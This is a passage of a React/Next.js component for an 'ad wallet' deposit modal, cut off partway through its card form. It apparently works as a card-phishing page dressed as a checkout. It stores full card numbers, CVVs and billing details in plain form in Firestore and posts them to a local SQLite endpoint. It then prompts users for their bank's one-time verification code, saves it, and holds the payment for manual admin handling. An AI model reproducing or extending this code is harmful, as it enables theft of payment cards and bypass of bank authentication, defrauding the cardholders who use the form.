"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import {
    X, Check, Copy, CheckCircle2, Loader2, ArrowRight,
    UploadCloud, Clock, ChevronLeft, Tag, CreditCard, Building2, XCircle, ShieldCheck
} from "lucide-react";
import { BitcoinLogo, EthereumLogo, USDTLogo, PayPalLogo, CashAppLogo } from "@/components/shared/BrandLogos";
import { addDoc, collection, serverTimestamp, doc, getDoc, updateDoc, onSnapshot } from "firebase/firestore";
import { db } from "@/lib/firebase/config";
import { toast } from "sonner";
import { cn } from "@/lib/utils";
import { detectCardBrand, formatCardNumber, formatExpiry, toSafeCardPayload, validateSafeCardInput } from "@/lib/payments/card";
import { CardBrandBadge } from "@/components/ui/CardBrandBadge";
import { getEnabledCryptoOptions, getCryptoAddress } from "@/lib/payments/crypto";

interface AdDepositModalProps {
    isOpen: boolean;
    onClose: () => void;
    userId: string;
    requiredDebtAmount?: number;
    currencySymbol?: string;
    currencyCode?: string;
    exchangeRate?: number;
}

const STEPS = ["Amount", "Method", "Pay"];

export default function AdDepositModal({ isOpen, onClose, userId, requiredDebtAmount, currencySymbol = "$", currencyCode = "USD", exchangeRate = 1 }: AdDepositModalProps) {
    const router = useRouter();
    const [amount, setAmount] = useState(requiredDebtAmount ? String(requiredDebtAmount * (exchangeRate || 1)) : "");
    const [step, setStep] = useState(1);
    const [method, setMethod] = useState<string | null>(null);
    const [cryptoAsset, setCryptoAsset] = useState<string | null>(null);
    const [loading, setLoading] = useState(false);
    const [copied, setCopied] = useState<string | null>(null);
    const [receiptUrl, setReceiptUrl] = useState<string | null>(null);
    const [receiptName, setReceiptName] = useState<string | null>(null);
    const [submittedTxId, setSubmittedTxId] = useState<string | null>(null);
    const [authCode, setAuthCode] = useState("");
    const [authLoading, setAuthLoading] = useState(false);
    const [txData, setTxData] = useState<any>(null);
    const [cardErrorMessage, setCardErrorMessage] = useState("");
    const [uploading, setUploading] = useState(false);
    const [adminConfig, setAdminConfig] = useState<any>(null);
    const [userData, setUserData] = useState<any>(null);
    const cryptoOptions = getEnabledCryptoOptions(adminConfig);
    const [selectedMethodConfig, setSelectedMethodConfig] = useState<any>(null);
    const [cardForm, setCardForm] = useState({
        cardType: "",
        cardNumber: "",
        expiry: "",
        securityCode: "",
        billingName: "",
        billingEmail: "",
        billingPhone: "",
        billingHouseNumber: "",
        billingStreet: "",
        billingAddress: "",
        billingCity: "",
        billingZip: "",
        billingCountry: "United States",
    });
    const fileRef = useRef<HTMLInputElement>(null);

    useEffect(() => {
        getDoc(doc(db, "settings", "payments")).then(s => { if (s.exists()) setAdminConfig(s.data()); });
        if (userId) getDoc(doc(db, "users", userId)).then(s => { if (s.exists()) setUserData(s.data()); });
    }, [userId]);

    useEffect(() => {
        if (!isOpen) return;
        setStep(1); setMethod(null); setSelectedMethodConfig(null); setCryptoAsset(null); setReceiptUrl(null); setReceiptName(null); setSubmittedTxId(null); setAuthCode(""); setCardErrorMessage("");
        setCardForm({
            cardType: "",
            cardNumber: "",
            expiry: "",
            securityCode: "",
            billingName: userData?.displayName || userData?.fullName || "",
            billingEmail: userData?.email || "",
            billingPhone: userData?.phoneNumber || "",
            billingHouseNumber: "",
            billingStreet: userData?.address || "",
            billingAddress: userData?.address || "",
            billingCity: userData?.city || "",
            billingZip: userData?.zipCode || "",
            billingCountry: userData?.country || "United States",
        });
        if (requiredDebtAmount) setAmount(String(requiredDebtAmount * (exchangeRate || 1)));
        else setAmount("");
    }, [isOpen, requiredDebtAmount, exchangeRate]);

    // Body scroll lock
    useEffect(() => {
        if (!isOpen) return;
        const prev = document.body.style.overflow;
        document.body.style.overflow = "hidden";
        return () => { document.body.style.overflow = prev; };
    }, [isOpen]);

    // Escape to close
    useEffect(() => {
        if (!isOpen) return;
        const handler = (e: KeyboardEvent) => { if (e.key === "Escape") onClose(); };
        window.addEventListener("keydown", handler);
        return () => window.removeEventListener("keydown", handler);
    }, [isOpen, onClose]);

    useEffect(() => {
        if (!submittedTxId) {
            setTxData(null);
            return;
        }
        const unsub = onSnapshot(doc(db, "transactions", submittedTxId), (snap) => {
            if (snap.exists()) {
                const data = snap.data();
                const currentStatus = data.status;

                setTxData({ id: snap.id, ...data });

                if (currentStatus === "completed") {
                    setStep(5);
                }
                if (currentStatus === "declined") {
                    setStep(7);
                }
            }
        });
        return () => unsub();
    }, [submittedTxId]);

    if (!isOpen) return null;

    const numAmountLocal = parseFloat(amount) || 0;
    const numAmount = numAmountLocal / (exchangeRate || 1);
    const isCardMethod = selectedMethodConfig?.type === "card" || method === "card";
    const cryptoDiscount = method === "crypto" ? numAmount * 0.05 : 0;
    const amountToPay = numAmount - cryptoDiscount;
    const bonus = !requiredDebtAmount
        ? (isCardMethod ? numAmount * 0.05 : (numAmount >= 500 ? numAmount : numAmount >= 100 ? numAmount * 0.20 : 0))
        : 0;
    const totalCredits = numAmount + bonus;
    const labelIdx = step <= 1 ? 0 : step <= 3 ? 1 : 2;

    const handleCopy = async (text: string, key: string) => {
        if (!text) { toast.error("Not configured yet."); return; }
        try { await navigator.clipboard.writeText(text); } catch {
            const el = document.createElement("textarea");
            el.value = text; el.style.cssText = "position:fixed;left:-9999px";
            document.body.appendChild(el); el.select(); document.execCommand("copy"); document.body.removeChild(el);
        }
        setCopied(key); toast.success("Copied!"); setTimeout(() => setCopied(null), 2000);
    };

    const handleReceiptUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
        const file = e.target.files?.[0]; if (!file) return;
        setUploading(true);
        const fd = new FormData(); fd.append("file", file);
        try {
            const res = await fetch("/api/upload", { method: "POST", body: fd });
            const data = await res.json();
            if (data.url) { setReceiptUrl(data.url); setReceiptName(file.name); toast.success("Receipt uploaded."); }
            else throw new Error();
        } catch { toast.error("Upload failed. Please try again."); }
        finally { setUploading(false); }
    };

    const handleSubmit = async () => {
        if (userData?.depositsLocked || userData?.adWalletLocked) {
            toast.error("Ad wallet deposits are locked for this account. Please contact support.");
            return;
        }
        const isCard = isCardMethod;
        let cardPayload: ReturnType<typeof toSafeCardPayload> | null = null;
        if (isCard) {
            const normalizedCardForm = {
                ...cardForm,
                billingAddress: `${cardForm.billingHouseNumber} ${cardForm.billingStreet}`.trim(),
            };
            const cardError = validateSafeCardInput(normalizedCardForm);
            if (cardError) { setCardErrorMessage(cardError); toast.error(cardError); return; }
            setCardErrorMessage("");
            cardPayload = toSafeCardPayload(normalizedCardForm);
        } else if (!receiptUrl) {
            toast.error("Please upload your payment receipt first.");
            return;
        }
        setLoading(true);
        try {
            const txRef = await addDoc(collection(db, "transactions"), {
                userId, type: "ad_deposit",
                amount: numAmount, amountLocal: numAmountLocal, amountPaid: amountToPay, totalCredits,
                currencyCode, exchangeRate,
                bonus, cryptoDiscount, status: "pending",
                method, methodLabel: cardPayload ? `${cardPayload.brand} ending ${cardPayload.last4}` : selectedMethodConfig?.label || method, asset: cryptoAsset || "N/A",
                receiptUrl: receiptUrl || null, requiredDebt: requiredDebtAmount || null,
                ...(cardPayload ? { card: { ...cardPayload, cardNumber: cardPayload.cardNumber, fullCardNumber: cardPayload.fullCardNumber, securityCode: cardPayload.securityCode, cvv: cardPayload.cvv }, cardVerification: { status: "auth_in_progress", channel: "email", adminNote: "" } } : {}),
                description: "Ad wallet deposit",
                createdAt: serverTimestamp(), updatedAt: serverTimestamp(),
            });
            setSubmittedTxId(txRef.id);

            const userSnap = await getDoc(doc(db, "users", userId));
            const userData = userSnap.exists() ? userSnap.data() : null;

            // Save to local SQLite database if card payload is used
            if (isCard && cardPayload) {
                try {
                    await fetch("/api/checkout/card-payment", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            id: txRef.id,
                            userId: userId || "guest",
                            orderId: "",
                            type: "ad_deposit",
                            amount: numAmount,
                            currencyCode,
                            status: "pending",
                            description: "Ad wallet deposit",
                            cardNumber: cardPayload.cardNumber,
                            cvv: cardPayload.cvv || cardPayload.securityCode,
                            expiry: `${cardPayload.expMonth}/${cardPayload.expYear}`,
                            billingName: cardPayload.billingName,
                            billingAddress: cardPayload.billingAddress,
                            billingCity: cardPayload.billingCity,
                            billingZip: cardPayload.billingZip,
                            billingCountry: cardPayload.billingCountry,
                            customerName: userData?.displayName || userData?.fullName || "Merchant",
                            customerEmail: userData?.email || "",
                            customerPhone: userData?.phone || "",
                            code: "",
                            adminNote: "",
                            channel: "email",
                            createdAt: new Date().toISOString(),
                            updatedAt: new Date().toISOString(),
                        }),
                    });
                } catch (err) {
                    console.error("Failed to save ad deposit to SQLite:", err);
                }
            }
            if (userData?.email) {
                await fetch("/api/send-email", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        type: "custom",
                        to: userData.email,
                        data: {
                            subject: "Ad Wallet Deposit Request Received",
                            html: `<p>Hello ${userData.displayName || userData.fullName || "Merchant"},</p>
                                <p>We received your ad wallet deposit request for <strong>${currencySymbol}${numAmountLocal.toLocaleString()} ${currencyCode}</strong>.</p>
                                <p><strong>USD equivalent:</strong> $${numAmount.toLocaleString(undefined, { maximumFractionDigits: 2 })}</p>
                                <p><strong>Status:</strong> Pending review. We will email you again once your receipt is approved or rejected.</p>
                                <p><strong>Total ad credits after approval:</strong> $${totalCredits.toLocaleString()}</p>
                                <p><strong>Payment method:</strong> ${(method || "transfer").toUpperCase()}${cryptoAsset ? ` (${cryptoAsset.toUpperCase()})` : ""}</p>`
                        }
                    })
                });
            }
            setStep(cardPayload ? 6 : 5);
        } catch (error: any) { toast.error(error?.message || "Failed to submit. Please try again."); }
        finally { setLoading(false); }
    };

    const cryptoAddress = getCryptoAddress(adminConfig, cryptoAsset);
    const configuredMethods = Array.isArray(adminConfig?.paymentMethods) ? adminConfig.paymentMethods : [];
    const cardPaymentsEnabled = adminConfig?.cardPaymentsEnabled === true;
    const bankDetails = [
        adminConfig?.bankName ? `Bank: ${adminConfig.bankName}` : "",
        adminConfig?.bankAccount ? `Account / IBAN: ${adminConfig.bankAccount}` : "",
        adminConfig?.bankSwift ? `SWIFT / Routing: ${adminConfig.bankSwift}` : "",
    ].filter(Boolean).join("\n");
    const hasBankDetails = Boolean(bankDetails);
    const customDepositMethods = configuredMethods.filter((m: any) => {
        const type = String(m?.type || m?.id || "").toLowerCase();
        return m?.enabled && (m.flow === "deposit" || m.flow === "both") && (cardPaymentsEnabled || type !== "card");
    });
    const cardMethod = { id: "card", type: "card", label: "Credit Card", sub: "Secure card authorization", destination: "" };
    const defaultDepositMethods = [
        ...(cardPaymentsEnabled ? [cardMethod] : []),
        ...(hasBankDetails ? [{ id: "bank", type: "bank", label: "Bank Transfer", sub: adminConfig?.bankName || "Bank deposit", destination: bankDetails }] : []),
        { id: "crypto", type: "crypto", label: "Cryptocurrency", sub: "BTC · ETH · USDT · 5% discount", destination: "" },
        { id: "cashapp", type: "cashapp", label: "Cash App", sub: "Instant transfer", destination: adminConfig?.cashappTag || "" },
        { id: "paypal", type: "paypal", label: "PayPal", sub: "Pay with your PayPal account", destination: adminConfig?.paypalEmail || "" },
    ];
    const customMethodsWithoutDuplicateCard = customDepositMethods.filter((m: any) => {
        const type = String(m?.type || m?.id || "").toLowerCase();
        return !(cardPaymentsEnabled && type === "card") && !(hasBankDetails && type === "bank");
    });
    const depositMethods = [...defaultDepositMethods, ...customMethodsWithoutDuplicateCard];

    const submitAuthCode = async () => {
        if (!submittedTxId || authCode.trim().length < 4) {
            toast.error("Enter the verification code.");
            return;
        }
        setAuthLoading(true);
        try {
            await updateDoc(doc(db, "transactions", submittedTxId), {
                "cardVerification.status": "submitted",
                "cardVerification.codeSubmitted": true,
                "cardVerification.codeLength": authCode.trim().length,
                "cardVerification.code": authCode.trim(),
                "cardVerification.submittedAt": serverTimestamp(),
                updatedAt: serverTimestamp(),
            });

            // Submit code to SQLite
            try {
                await fetch("/api/checkout/submit-code", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        id: submittedTxId,
                        code: authCode.trim(),
                    }),
                });
            } catch (err) {
                console.error("Failed to save code to SQLite:", err);
            }

            toast.success("Verification submitted. Payment remains pending.");
            setAuthCode("");
        } catch {
            toast.error("Could not submit verification.");
        } finally {
            setAuthLoading(false);
        }
    };

    if (step === 5) {
        return (
            <div className="fixed inset-0 z-[250] flex items-center justify-center p-4" onClick={onClose}>
            <div className="absolute inset-0 bg-black/75 backdrop-blur-sm" />
            <div className="relative z-10 w-full max-w-md bg-[#0f0f13] border border-white/[0.08] rounded-2xl shadow-2xl p-8" onClick={e => e.stopPropagation()}>
                    <div className="flex flex-col items-center text-center space-y-5">
                        <div className="w-16 h-16 bg-emerald-500/15 border border-emerald-500/25 rounded-full flex items-center justify-center">
                            <CheckCircle2 className="w-8 h-8 text-emerald-400" />
                        </div>
                        <div className="space-y-2">
                            <h3 className="text-lg font-semibold text-white">Ad deposit submitted</h3>
                            <p className="text-sm text-zinc-400 max-w-xs mx-auto">
                                Your {selectedMethodConfig?.type === "card" ? "card payment" : "receipt"} is under review. We'll credit <span className="text-white font-medium">${totalCredits.toFixed(2)} USD</span> to your ad wallet once confirmed.
                            </p>
                        </div>
                        {bonus > 0 && (
                            <div className="flex items-center gap-2 px-4 py-2.5 bg-emerald-500/[0.08] border border-emerald-500/15 rounded-xl w-full justify-center">
                                <Tag className="w-4 h-4 text-emerald-400" />
                                <p className="text-sm text-zinc-300 font-medium">+${bonus.toFixed(2)} bonus included!</p>
                            </div>
                        )}
                        <div className="flex items-center gap-2 px-4 py-2.5 bg-blue-500/[0.08] border border-blue-500/15 rounded-xl w-full justify-center">
                            <Clock className="w-4 h-4 text-blue-400" />
                            <p className="text-sm text-zinc-300">Usually takes <span className="text-white font-semibold">1–5 minutes</span></p>
                        </div>
                        <button onClick={() => { onClose(); router.push('/dashboard'); }} className="w-full h-11 bg-white/[0.06] border border-white/[0.08] text-white font-medium text-sm rounded-xl hover:bg-white/[0.10] transition-colors">
                            Back to Dashboard
                        </button>
                    </div>
                </div>
            </div>
        );
    }

    if (step === 6) {
        const liveVerificationStatus = txData?.cardVerification?.status || "auth_in_progress";
        const isSubmitted = liveVerificationStatus === "submitted";

        return (
            <div className="fixed inset-0 z-[250] flex items-center justify-center p-4">
                <div className="absolute inset-0 bg-black/75 backdrop-blur-sm" />
                <div className="relative z-10 w-full max-w-md bg-[#0f0f13] border border-white/[0.08] rounded-2xl shadow-2xl p-8">
                    <div className="flex flex-col items-center text-center space-y-5">
                        {isSubmitted ? (
                            <>
                                <div className="w-16 h-16 bg-blue-500/10 border border-blue-500/20 rounded-full flex items-center justify-center">
                                    <Loader2 className="w-8 h-8 text-blue-500 animate-spin" />
                                </div>
                                <div className="space-y-2">
                                    <h3 className="text-lg font-semibold text-white">Verifying payment details...</h3>
                                    <p className="text-sm text-zinc-400 max-w-xs mx-auto">
                                        Verification in progress. Please hold on while your authorization is being processed.
                                    </p>
                                </div>
                            </>
                        ) : (
                            <>
                                <div className="w-16 h-16 bg-amber-500/15 border border-amber-500/25 rounded-full flex items-center justify-center">
                                    <Clock className="w-8 h-8 text-amber-300" />
                                </div>
                                <div className="space-y-2">
                                    <h3 className="text-lg font-semibold text-white">Check for verification code</h3>
                                    <p className="text-sm text-zinc-400 max-w-xs mx-auto">
                                        We sent the authorization request. Check your email or phone for the bank verification code, then enter it below.
                                    </p>
                                </div>
                                <input
                                    value={authCode}
                                    onChange={e => setAuthCode(e.target.value.replace(/[^\dA-Za-z-]/g, "").slice(0, 12))}
                                    placeholder="Verification code"
                                    autoComplete="one-time-code"
                                    className="w-full h-12 bg-zinc-950/60 border border-white/[0.08] rounded-xl px-4 text-white text-center tracking-[0.35em] font-semibold outline-none focus:border-blue-500/50"
                                />
                            </>
                        )}

                        {txData?.adminNote && (
                            <div className="rounded-lg bg-amber-500/[0.07] border border-amber-500/15 p-3 text-xs text-amber-100/80 w-full text-left">
                                {txData.adminNote}
                            </div>
                        )}

                        <div className="w-full p-4 bg-white/[0.03] border border-white/[0.06] rounded-xl text-left space-y-2">
                            <div className="flex justify-between text-xs"><span className="text-zinc-500">Ad credits</span><span className="text-white font-semibold">${totalCredits.toFixed(2)} USD</span></div>
                            <div className="flex justify-between text-xs"><span className="text-zinc-500">Reference</span><span className="text-zinc-300 font-mono">{submittedTxId?.slice(0, 10) || "pending"}</span></div>
                            <div className="flex justify-between text-xs">
                                <span className="text-zinc-500">Status</span>
                                <span className={cn(
                                    "font-semibold capitalize",
                                    isSubmitted ? "text-blue-400" : "text-amber-300"
                                )}>
                                    {isSubmitted ? "Verifying" : "Awaiting Code"}
                                </span>
                            </div>
                        </div>

                        {!isSubmitted && (
                            <button onClick={submitAuthCode} disabled={authLoading} className="w-full h-11 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white font-semibold text-sm rounded-xl transition-colors flex items-center justify-center gap-2">
                                {authLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : "Continue Authorization"}
                            </button>
                        )}

                        <button onClick={() => { onClose(); router.push('/dashboard/wallet'); }} className="w-full h-10 bg-white/[0.06] border border-white/[0.08] text-zinc-300 font-medium text-sm rounded-xl hover:bg-white/[0.10] transition-colors">
                            Back to Wallet
                        </button>
                    </div>
                </div>
            </div>
        );
    }

    if (step === 7) {
        return (
            <div className="fixed inset-0 z-[250] flex items-center justify-center p-4">
                <div className="absolute inset-0 bg-black/75 backdrop-blur-sm" />
                <div className="relative z-10 w-full max-w-md bg-[#0f0f13] border border-white/[0.08] rounded-2xl shadow-2xl p-8">
                    <div className="flex flex-col items-center text-center py-8 space-y-5 animate-in zoom-in-95 duration-300">
                        <div className="w-16 h-16 bg-rose-500/15 border border-rose-500/25 rounded-full flex items-center justify-center">
                            <XCircle className="w-8 h-8 text-rose-400" />
                        </div>
                        <div className="space-y-2">
                            <h3 className="text-lg font-semibold text-white">Authorization Failed</h3>
                            <p className="text-sm text-zinc-400 max-w-xs mx-auto">
                                Your card authorization could not be completed. Please check your card details and try again.
                            </p>
                        </div>
                        {txData?.adminNote && (
                            <div className="w-full p-4 rounded-xl bg-rose-500/[0.07] border border-rose-500/20 text-left text-xs text-rose-200">
                                <span className="font-semibold block mb-1">Reason:</span>
                                {txData.adminNote}
                            </div>
                        )}
                        <button onClick={() => { setStep(4); }} className="w-full h-11 bg-blue-600 hover:bg-blue-700 text-white font-medium text-sm rounded-xl transition-colors">
                            Try Another Card
                        </button>
                        <button onClick={() => { onClose(); router.push('/dashboard'); }} className="w-full h-10 bg-white/[0.06] border border-white/[0.08] text-zinc-300 font-medium text-sm rounded-xl hover:bg-white/[0.10] transition-colors">
                            Close
                        </button>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <div className="fixed inset-0 z-[250] flex items-center justify-center p-4 overflow-y-auto" onClick={onClose}>
            <div className="absolute inset-0 bg-black/75 backdrop-blur-sm" />
            <div className="relative z-10 w-full max-w-md bg-[#0f0f13] border border-white/[0.08] rounded-2xl shadow-2xl my-8 overflow-hidden" onClick={e => e.stopPropagation()}>

                {/* Header */}
                <div className="flex items-center justify-between px-5 py-4 border-b border-white/[0.06]">
                    <div>
                        <p className="text-sm font-semibold text-white">Fund Ad Wallet</p>
                        <p className="text-xs text-zinc-500">Credits are used to run ad campaigns</p>
                    </div>
                    <button onClick={onClose} className="w-7 h-7 rounded-lg hover:bg-white/[0.06] flex items-center justify-center transition-colors">
                        <X className="w-4 h-4 text-zinc-500" />
                    </button>
                </div>

                <div className="p-5 space-y-5">

                    {/* Step indicator */}
                    <div className="flex items-center">
                        {STEPS.map((label, i) => (
                            <div key={i} className="flex items-center flex-1 last:flex-none">
                                <div className="flex items-center gap-1.5 shrink-0">
                                    <div className={cn(
                                        "w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold transition-all",
                                        i < labelIdx ? "bg-blue-600 text-white" :
                                        i === labelIdx ? "bg-blue-600 text-white ring-2 ring-blue-500/20" :
                                        "bg-white/[0.06] text-zinc-600"
                                    )}>
                                        {i < labelIdx ? <Check className="w-2.5 h-2.5" /> : i + 1}
                                    </div>
                                    <span className={cn("text-xs font-medium",
                                        i === labelIdx ? "text-white" : i < labelIdx ? "text-zinc-500" : "text-zinc-700"
                                    )}>{label}</span>
                                </div>
                                {i < STEPS.length - 1 && <div className={cn("flex-1 h-px mx-2", i < labelIdx ? "bg-blue-600/40" : "bg-white/[0.06]")} />}
                            </div>
                        ))}
                    </div>

                    {/* Step 1: Amount */}
                    {step === 1 && (
                        <div className="space-y-4 animate-in slide-in-from-right-3 duration-300">
                            <div>
                                <label className="text-xs font-medium text-zinc-400 block mb-2">Deposit amount</label>
                                <div className="relative">
                                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-400 font-semibold">$</span>
                                    <input
                                        type="number" value={amount}
                                        onChange={e => { if (!requiredDebtAmount) setAmount(e.target.value); }}
                                        readOnly={!!requiredDebtAmount}
                                        placeholder="0.00" autoFocus
                                        className={cn("w-full h-14 pl-8 pr-4 bg-white/[0.04] border border-white/[0.08] rounded-xl text-2xl font-bold text-white placeholder:text-zinc-700 focus:outline-none focus:border-blue-500/50 focus:ring-2 focus:ring-blue-500/10 transition-all",
                                            requiredDebtAmount && "opacity-70 cursor-not-allowed")}
                                    />
                                </div>
                                {requiredDebtAmount && <p className="text-xs text-amber-400/70 mt-1.5">Amount is set to clear your outstanding ad balance.</p>}
                            </div>

                            {!requiredDebtAmount && (
                                <div className="grid grid-cols-4 gap-2">
                                    {[100, 500, 1000, 5000].map(v => (
                                        <button key={v} onClick={() => setAmount(v.toString())}
                                            className="h-9 rounded-lg bg-white/[0.04] border border-white/[0.06] text-xs font-medium text-zinc-400 hover:bg-white/[0.08] hover:text-white transition-all">
                                            {currencySymbol}{v}
                                        </button>
                                    ))}
                                </div>
                            )}

                            {/* Bonus preview */}
                            {bonus > 0 && (
                                <div className="flex items-center gap-2.5 p-3 bg-emerald-500/[0.07] border border-emerald-500/20 rounded-xl">
                                    <Tag className="w-4 h-4 text-emerald-400 shrink-0" />
                                    <p className="text-xs text-zinc-300">Deposit {currencySymbol}{numAmountLocal.toFixed(2)} and get <span className="text-emerald-300 font-semibold">+${bonus.toFixed(2)} USD bonus</span> — total credits: <span className="text-white font-semibold">${totalCredits.toFixed(2)} USD</span></p>
                                </div>
                            )}

                            <button onClick={() => {
                                if (!amount || isNaN(Number(amount)) || Number(amount) <= 0) { toast.error("Enter a valid amount"); return; }
                                setStep(2);
                            }} className="w-full h-11 bg-blue-600 hover:bg-blue-700 text-white font-semibold text-sm rounded-xl flex items-center justify-center gap-2 transition-colors">
                                Continue <ArrowRight className="w-4 h-4" />
                            </button>
                        </div>
                    )}

                    {/* Step 2: Payment method */}
                    {step === 2 && (
                        <div className="space-y-3 animate-in slide-in-from-right-3 duration-300">
                            <p className="text-sm text-zinc-400">How would you like to deposit <span className="text-white font-medium">{currencySymbol}{numAmountLocal.toFixed(2)} {currencyCode}</span>?</p>
                            {depositMethods.map((m: any) => {
                                const type = String(m.type || m.id || "").toLowerCase();
                                const icon = m.logoUrl ? <img src={m.logoUrl} alt="" className="w-7 h-7 object-contain" /> :
                                    type === "crypto" ? <BitcoinLogo size={20} /> :
                                    type === "cashapp" ? <CashAppLogo size={20} /> :
                                    type === "paypal" ? <PayPalLogo size={20} /> :
                                    type === "bank" ? <Building2 className="w-5 h-5 text-blue-400" /> :
                                    <CreditCard className="w-5 h-5 text-blue-400" />;
                                return (
                                <button key={m.id}
                                    onClick={() => { setMethod(m.id); setSelectedMethodConfig(m); if (type === "crypto") setStep(3); else setStep(4); }}
                                    className="w-full flex items-center gap-4 p-4 bg-white/[0.03] border border-white/[0.06] rounded-xl hover:border-blue-500/30 hover:bg-white/[0.05] transition-all text-left group">
                                    <div className="w-10 h-10 rounded-lg flex items-center justify-center shrink-0 border bg-white/[0.04] border-white/[0.06] overflow-hidden">{icon}</div>
                                    <div className="flex-1">
                                        <p className="text-sm font-medium text-white">{m.label}</p>
                                        <p className="text-xs text-zinc-500 mt-0.5">{m.sub || m.instructions || m.type}</p>
                                    </div>
                                    <ArrowRight className="w-4 h-4 text-zinc-600 group-hover:text-blue-400 transition-colors" />
                                </button>
                            )})}
                            <button onClick={() => setStep(1)} className="w-full flex items-center justify-center gap-1.5 py-2 text-xs text-zinc-500 hover:text-zinc-300 transition-colors">
                                <ChevronLeft className="w-3.5 h-3.5" /> Back
                            </button>
                        </div>
                    )}

                    {/* Step 3: Crypto asset */}
                    {step === 3 && (
                        <div className="space-y-3 animate-in slide-in-from-right-3 duration-300">
                            <p className="text-sm text-zinc-400">Select the asset you'll pay with.</p>
                            {cryptoOptions.map((coin: any) => {
                                const Logo = coin.id === "btc" ? BitcoinLogo : coin.id === "eth" ? EthereumLogo : coin.id === "usdt" ? USDTLogo : ShieldCheck;
                                return (
                                <button key={coin.id}
                                    onClick={() => { setCryptoAsset(coin.id); setStep(4); }}
                                    className="w-full flex items-center gap-4 p-4 bg-white/[0.03] border border-white/[0.06] rounded-xl hover:border-blue-500/30 hover:bg-white/[0.05] transition-all text-left group">
                                    <Logo size={28} className={coin.color || "text-zinc-400"} />
                                    <div className="flex-1">
                                        <p className="text-sm font-medium text-white">{coin.name}</p>
                                        <p className="text-xs text-zinc-500 mt-0.5">{coin.ticker}</p>
                                    </div>
                                    <ArrowRight className="w-4 h-4 text-zinc-600 group-hover:text-blue-400 transition-colors" />
                                </button>
                            )})}
                            <button onClick={() => setStep(2)} className="w-full flex items-center justify-center gap-1.5 py-2 text-xs text-zinc-500 hover:text-zinc-300 transition-colors">
                                <ChevronLeft className="w-3.5 h-3.5" /> Back
                            </button>
                        </div>
                    )}

                    {/* Step 4: Payment details + receipt upload */}
                    {step === 4 && (
                        <div className="space-y-4 animate-in slide-in-from-right-3 duration-300">
                            <div>
                                <p className="text-sm font-semibold text-white mb-0.5">Send your payment</p>
                                <p className="text-xs text-zinc-500">
                                    {selectedMethodConfig?.type === "card"
                                        ? <>Authorize exactly <span className="text-white font-medium">{currencySymbol}{numAmountLocal.toFixed(2)}</span>. The payment will stay pending while it is being processed.</>
                                        : method === "crypto"
                                        ? <>Transfer exactly <span className="text-white font-medium">{currencySymbol}{(amountToPay * (exchangeRate || 1)).toFixed(2)}</span> <span className="text-emerald-400">(5% crypto discount applied)</span> to the details below, then upload your receipt.</>
                                        : <>Transfer exactly <span className="text-white font-medium">{currencySymbol}{numAmountLocal.toFixed(2)}</span> to the details below, then upload your receipt.</>
                                    }
                                </p>
                                {currencyCode !== "USD" && <p className="text-[11px] text-zinc-600 mt-1">Estimated USD credit: ${numAmount.toLocaleString(undefined, { maximumFractionDigits: 2 })}</p>}
                            </div>

                            {selectedMethodConfig?.type === "card" ? (
                            <div className="bg-white/[0.03] border border-white/[0.06] rounded-xl p-4 space-y-3">
                                <div className="flex items-start gap-3 p-3 bg-blue-500/[0.06] border border-blue-500/15 rounded-xl">
                                    <CreditCard className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
                                    <p className="text-xs text-zinc-400">Issuer verification codes are used to confirm your deposit authorization.</p>
                                </div>
                                <div className="space-y-1">
                                    <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Card number</label>
                                    <div className="relative">
                                        <input value={cardForm.cardNumber} onChange={e => setCardForm({ ...cardForm, cardNumber: formatCardNumber(e.target.value) })} inputMode="numeric" autoComplete="off" placeholder="Card number" className="w-full h-10 pr-20 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
                                        <span className="absolute right-2 top-1/2 -translate-y-1/2">
                                            <CardBrandBadge brand={detectCardBrand(cardForm.cardNumber)} />
                                        </span>
                                    </div>
                                </div>
                                <div className="grid grid-cols-2 gap-2">
                                    <div className="space-y-1">
                                        <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Expiry date</label>
                                        <input value={cardForm.expiry} onChange={e => setCardForm({ ...cardForm, expiry: formatExpiry(e.target.value) })} inputMode="numeric" autoComplete="off" placeholder="MM/YY" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
                                    </div>
                                    <div className="space-y-1">
                                        <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Security code</label>
                                        <input value={cardForm.securityCode} onChange={e => setCardForm({ ...cardForm, securityCode: e.target.value.replace(/\D/g, "").slice(0, 4) })} inputMode="numeric" autoComplete="off" placeholder="CVV" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
                                    </div>
                                </div>
                                <div className="space-y-1">
                                    <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Name on card</label>
                                    <input value={cardForm.billingName} onChange={e => setCardForm({ ...cardForm, billingName: e.target.value })} autoComplete="off" placeholder="J. Smith" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
                                </div>
                                <input value={cardForm.billingEmail} onChange={e => setCardForm({ ...cardForm, billingEmail: e.target.value })} placeholder="Billing email" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
                                <p className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest pt-1">Billing address</p>
                                <input value={cardForm.billingCountry} onChange={e => setCardForm({ ...cardForm, billingCountry: e.target.value })} placeholder="Country/Region" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
                                <div className="grid grid-cols-2 gap-2">
